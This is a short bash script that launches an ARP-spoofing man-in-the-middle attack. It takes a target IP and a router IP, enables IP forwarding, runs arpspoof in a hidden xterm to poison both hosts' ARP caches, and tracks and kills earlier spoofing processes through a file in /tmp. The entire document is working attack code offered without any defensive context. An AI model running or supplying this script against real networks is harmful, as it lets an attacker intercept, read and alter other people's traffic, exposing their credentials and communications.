#!/bin/bash
if [ -z $1 ]; then
	echo "We need a target IP!!";
	exit 1;
fi;
if [ -z $2 ]; then
	echo "We need a router IP!!";
	exit 1;
fi;
echo 1 > /proc/sys/net/ipv4/ip_forward
xterm -iconic -T "ARPSPOOF ==> $1" -e "arpspoof -r -t $1 $2" &
pid=$!;
if [ -f /tmp/spoof.arp ]; then
	if grep -Fq -e $1 /tmp/spoof.arp; then
		IFS=$'\n';
		for l in `grep $1 /tmp/spoof.arp`; do
			kill `echo $l | awk '{print $2}'` 2&>/dev/null;
			sed -i "/$l/d" /tmp/spoof.arp
		done;
	fi;
fi;
echo "$1 $pid" >> /tmp/spoof.arp;
